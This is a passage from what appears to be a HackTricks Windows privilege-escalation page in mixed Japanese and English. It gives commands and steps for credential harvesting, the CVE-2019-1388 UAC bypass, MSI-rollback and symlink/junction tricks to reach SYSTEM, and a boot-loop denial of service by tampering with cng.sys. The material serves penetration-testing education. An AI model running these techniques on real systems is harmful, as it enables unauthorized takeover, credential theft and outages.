[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) はこのページで言及されているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、システムからパスワードを抽出するための優れたツールです。

ツール[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher)は、このデータを平文で保存するPuTTY、WinSCP、FileZilla、SuperPuTTY、およびRDPなどの複数のツールの**sessions**, **usernames**, **passwords**を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

共有メモリセグメント（**pipes** と呼ばれる）は、プロセス間の通信とデータ転送を可能にします。

Windows は **Named Pipes** 機能を提供しており、関連のないプロセス間でもデータ共有が可能です（ネットワーク越しでも）。これは **named pipe server** と **named pipe client** というクライアント/サーバー型の役割に似ています。

クライアントがパイプを通じてデータを送ると、パイプを設定した **server** は必要な **SeImpersonate** 権限がある場合に **client の identity を引き受ける** ことができます。あなたが模倣できるパイプ経由で通信する **権限の高いプロセス** を特定できれば、そのプロセスがあなたの作成したパイプとやり取りした際にそのプロセスの identity を採用することで **より高い権限を取得** するチャンスが生まれます。こうした攻撃の実行方法については [**ここ**](named-pipe-client-impersonation.md) と [**ここ**](#from-high-integrity-to-system) を参照してください。

また、次のツールは burp のようなツールで named pipe の通信を **インターセプト** するのに使えます: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **そしてこのツールはすべてのパイプを列挙して privescs を見つけるのに使えます** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## その他

### File Extensions that could execute stuff in Windows

ページを確認してください: **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links forwarded to `ShellExecuteExW` can trigger dangerous URI handlers (`file:`, `ms-appinstaller:` or any registered scheme) and execute attacker-controlled files as the current user. See:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **コマンドライン上のパスワードの監視**

ユーザーとしてシェルを取得した場合、scheduled tasks や他のプロセスが **コマンドライン上で認証情報を渡している** ことがあります。以下のスクリプトはプロセスのコマンドラインを2秒ごとに取得し、現在の状態と前回の状態を比較して差分を出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからパスワードを盗む

## 低特権ユーザーから NT\AUTHORITY SYSTEM への権限昇格 (CVE-2019-1388) / UAC Bypass

コンソールや RDP 経由でグラフィカルインターフェースにアクセスでき、UAC が有効になっている場合、Microsoft Windows の一部のバージョンでは、低特権ユーザーからターミナルや他のプロセス（例: "NT\AUTHORITY SYSTEM"）を実行することが可能です。

これにより、同じ脆弱性を利用して権限を昇格させつつ UAC をバイパスすることが可能になります。さらに、何かをインストールする必要はなく、プロセス中に使用されるバイナリは Microsoft によって署名・発行されています。

影響を受けるシステムの例は以下の通りです:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を悪用するには、次の手順を実行する必要があります:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## 管理者（Administrator）の Medium から High Integrity Level / UAC Bypass

Integrity Levels について学ぶには、次を読んでください:


{{#ref}}
integrity-levels.md
{{#endref}}

次に、UAC と UAC bypasses について学ぶには、こちらを読んでください:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

攻撃は基本的に、Windows Installer の rollback 機能を悪用して、アンインストール時に正当なファイルを悪意のあるファイルに置き換えるものです。そのために攻撃者は、`C:\Config.Msi` フォルダをハイジャックするための **malicious MSI installer** を作成する必要があります。これにより、他の MSI パッケージのアンインストール中に Windows Installer が rollback ファイルを保存する際に、その rollback ファイルを改変して悪意あるペイロードを含めることができます。

要約すると手順は次のとおりです：

1. Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. Stage 2 – Replacing Rollback Scripts with Malicious Ones

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit NTFS internals: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
このストリームはフォルダの**インデックスメタデータ**を格納します。

したがって、フォルダの**`::$INDEX_ALLOCATION`ストリームを削除すると**、NTFSはファイルシステムから**フォルダ全体を削除します**。

これは次のような標準のファイル削除APIを使って実行できます:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> たとえ *file* delete API を呼び出していても、**フォルダ自体は削除されます**。

### From Folder Contents Delete to SYSTEM EoP
あなたのプリミティブが任意のファイル/フォルダを削除できないが、攻撃者が制御するフォルダの*contents*の削除を**許可している**としたら？

1. Step 1: 餌フォルダとファイルをセットアップする
- 作成: `C:\temp\folder1`
- その中に: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を配置する
- この oplock は、特権プロセスが `file1.txt` を削除しようとしたときに実行を**一時停止**させる。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. ステップ 3: SYSTEM プロセスをトリガーする (例: `SilentCleanup`)
- このプロセスはフォルダ (例: `%TEMP%`) をスキャンし、その内容を削除しようとします。
- `file1.txt` に到達すると、**oplock がトリガーされ**、コントロールがあなたのコールバックに渡されます。

4. ステップ 4: oplock コールバック内 – 削除をリダイレクトする

- オプション A: `file1.txt` を別の場所に移動する
- これにより、oplock を壊さずに `folder1` を空にできます。
- `file1.txt` を直接削除しないでください — それは oplock を早期に解除してしまいます。

- オプション B: `folder1` を **junction** に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これはフォルダのメタデータを格納するNTFSの内部ストリームを標的としています — それを削除するとフォルダ自体が削除されます。

5. ステップ5: oplock を解放する
- SYSTEM プロセスが続行し、`file1.txt` を削除しようとします。
- しかし今では、junction + symlink のため、実際には以下を削除しています:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**結果**: `C:\Config.Msi` は SYSTEM によって削除されます。

### From Arbitrary Folder Create to Permanent DoS

このプリミティブを悪用すると、たとえファイルを書き込めない、または弱い権限を設定できない場合でも、**SYSTEM/admin として任意のフォルダを作成**できます。

重要な Windows ドライバの名前を持つ**フォルダ**（ファイルではなく）を作成します。例：
```
C:\Windows\System32\cng.sys
```
- This path normally corresponds to the `cng.sys` kernel-mode driver.
- If you **フォルダとして事前に作成すると**, Windows fails to load the actual driver on boot.
- Then, Windows tries to load `cng.sys` during boot.
- It sees the folder, **実際のドライバを解決できず**, and **クラッシュまたはブートが停止する**.
- There’s **フォールバックはない**, and **外部介入なしでは回復できない** (e.g., boot repair or disk access).

### 特権ログ/バックアップパス + OM symlinks から 任意のファイル上書き / boot DoS へ

When a **privileged service** writes logs/exports to a path read from a **writable config**, redirect that path with **Object Manager symlinks + NTFS mount points** to turn the privileged write into an arbitrary overwrite (even **without** SeCreateSymbolicLinkPrivilege).

**Requirements**
- 対象パスを格納している設定ファイルが攻撃者によって書き込み可能であること（例: `%ProgramData%\...\.ini`）。
- `\RPC Control` へのマウントポイントと OM ファイル symlink を作成できること (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools))。
- そのパスに書き込む特権操作（ログ、エクスポート、レポートなど）。

**Example chain**
1. 設定を読み取り、特権ログの出力先を取得する。例: `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. 管理者権限なしでパスをリダイレクトする:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待つ（例：管理者が "send test SMS" をトリガーする）。書き込みは現在 `C:\Windows\System32\cng.sys` に行われる。  
4. 上書きされたターゲット（hex/PE parser）を検査して破損を確認する。再起動によって Windows は改ざんされたドライバパスを読み込み → **boot loop DoS** となる。これは、特権サービスが書き込みのために開く任意の保護ファイルにも一般化する。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` からロードされるが、`C:\Windows\System32\cng.sys` にコピーが存在する場合は先に試されることがあり、破損データに対する信頼できる DoS sink になる。



## **High Integrity から SYSTEM へ**

### **新しいサービス**

既に High Integrity プロセスで実行している場合、**path to SYSTEM** は新しいサービスを**作成して実行する**だけで簡単に達成できる：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> service binary を作成する際は、それが有効な service であるか、あるいはバイナリが必要な処理を十分に速く実行することを確認してください。そうでない場合、有効な service でなければ20sで終了されます。

### AlwaysInstallElevated

High Integrity プロセスから、**AlwaysInstallElevated registry entries を有効にし**、_**.msi**_ ラッパーを使ってリバースシェルを**インストール**することを試みることができます。\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

もしこれらの token privileges を持っていれば（おそらく既に High Integrity プロセス内で見つかるでしょう）、SeDebug privilege を使って（protected processes ではない）ほぼ任意のプロセスを開き、そのプロセスの token をコピーして、その token で任意のプロセスを作成することができます。\
通常は、**すべての token privileges を持つ SYSTEM として実行されているプロセスを選択**します（_はい、すべての token privileges を持たない SYSTEM プロセスも存在します_）。\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

この手法は meterpreter が `getsystem` を実行する際に使用されます。手法は **パイプを作成し、サービスを作成/悪用してそのパイプに書き込ませる** ことです。すると、そのパイプを `SeImpersonate` privilege を使って作成した **server** は、パイプクライアント（サービス）の token を **impersonate** することができ、SYSTEM 権限を取得できます。\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

もし SYSTEM として実行されているプロセスによってロードされる dll を **hijack** できれば、その権限で任意のコードを実行できます。したがって Dll Hijacking はこの種の権限昇格にも有用であり、さらに high integrity プロセスからのほうが **はるかに達成しやすい** です。なぜなら dll をロードするフォルダに対する **write permissions** を持っているからです。\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Check for misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts crendentials from Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS spoofer and man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials from lots of softwares (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations (exe from python). Not recommended. It does not work well in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool created based in this post (it does not need accesschk to work properly but it can use it).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Reads the output of **systeminfo** and recommends working exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Reads the output of **systeminfo** andrecommends working exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

プロジェクトは正しいバージョンの .NET でコンパイルする必要があります（[see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者ホストにインストールされている .NET のバージョンを確認するには次のようにしてください：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考資料

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
